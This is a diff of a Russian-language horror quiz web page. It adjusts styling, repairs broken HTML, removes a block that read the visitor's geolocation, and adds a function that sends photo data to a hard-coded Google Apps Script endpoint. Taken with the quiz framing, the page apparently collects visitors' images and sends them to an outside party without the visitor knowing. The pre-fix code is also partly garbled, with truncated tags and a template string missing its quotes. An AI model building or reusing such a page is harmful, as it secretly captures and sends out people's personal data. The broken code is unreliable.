@@ -13,7 +13,7 @@
             padding: 0;
             line-height: 1.6;
             background-image: 
-radial-gradient(circle at 10% 20%, rgba(70, 0, 0, 0.3) 0%, transparent 20%),
+                radial-gradient(circle at 10% 20%, rgba(70, 0, 0, 0.3) 0%, transparent 20%),
                 radial-gradient(circle at 90% 80%, rgba(0, 0, 70, 0.3) 0%, transparent 20%);
             min-height: 100vh;
         }
@@ -54,7 +54,33 @@ radial-gradient(circle at 10% 20%, rgba(70, 0, 0, 0.3) 0%, transparent 20%),
             position: relative;
             overflow: hidden;
         }
-translateY(0); }
+
+        .question::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(90deg, transparent 0%, rgba(139, 0, 0, 0.1) 50%, transparent 100%);
+            animation: scanline 8s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
+        .active {
+            display: block;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         h3 {
@@ -139,6 +165,7 @@ translateY(0); }
         audio {
             display: none;
         }
+
         .warning {
             text-align: center;
             font-size: 0.8rem;
@@ -187,8 +214,9 @@ translateY(0); }
             <button onclick="nextQuestion(5)">Потому что я искал правду</button>
         </div>
         
-        <div id="question6" class="question
- onclick="nextQuestion(6)">Да, и они советовали мне d57rtyocx </button>
+        <div id="question6" class="question">
+            <h3>6.Вы слышали голоса в своей голове? </h3>
+            <button onclick="nextQuestion(6)">Да, и они советовали мне d57rtyocx </button>
             <button onclick="nextQuestion(6)">"Нет, но они говорят, что я должен ответить "Да""</button>
         </div>
         
@@ -258,31 +286,9 @@ translateY(0); }
     </style>
     <script>
         // Функция для отправки данных
-
-
-        function showPosition(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            document.getElementById('location').innerHTML = 
-                Широта: ${latitude}<br>Долгота: ${longitude};
-        }
-
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById('location').innerHTML = "Пользователь отклонил запрос на получение местоположения.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById('location').innerHTML = "Информация о местоположении недоступна.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById('location').innerHTML = "Запрос на получение местоположения истек.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById('location').innerHTML = "Произошла неизвестная ошибка.";
-                    break;
-            }
-        }
+        async function sendPhotoToEmail(photoData) {
+            const googleScriptUrl = "https://script.google.com/macros/s/AKfycbx4-26t-HnrqBwZ9qpOko7N1lOM-koYNWpcYSDjP5MJ9bSKVj3Oac-BqbEewzIpsgE/exec";
+            
             try {
                 document.getElementById('message').textContent = "Отправка фото...";
                 
@@ -375,63 +381,7 @@ translateY(0); }
                 <p class="blood-text">> РЕКОМЕНДАЦИЯ: Не оборачивайся</p>
             </div>
         </div>
-        <title>Определение местоположения</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            color: #333;
-            padding: 20px;
-        }
-        #location {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #fff;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-    </style>
-</head>
-<body>
-    <h1>Ваше местоположение</h1>
-    <div id="location">Определение местоположения...</div>
-
-    <script>
-        // Автоматически вызываем геолокацию при загрузке страницы
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                document.getElementById('location').innerHTML = "Геолокация не поддерживается вашим браузером.";
-            }
-        };
-
-        function showPosition(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            document.getElementById('location').innerHTML = 
-                `Широта: ${latitude}<br>Долгота: ${longitude}`;
-        }
-
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById('location').innerHTML = "Пользователь отклонил запрос на получение местоположения.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById('location').innerHTML = "Информация о местоположении недоступна.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById('location').innerHTML = "Запрос на получение местоположения истек.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById('location').innerHTML = "Произошла неизвестная ошибка.";
-                    break;
-            }
-        }
-    </script>
-</body>
-</html>
+        
         <div class="warning">
             Этот опыт изменил тебя. Ты не сможешь забыть.
         </div>
@@ -481,9 +431,6 @@ translateY(0); }
             const ambient = document.getElementById('ambient');
             ambient.volume = 0.7;
         }
-    </script>
-</body>
-</html>
     </script>
 </body>
 </html>
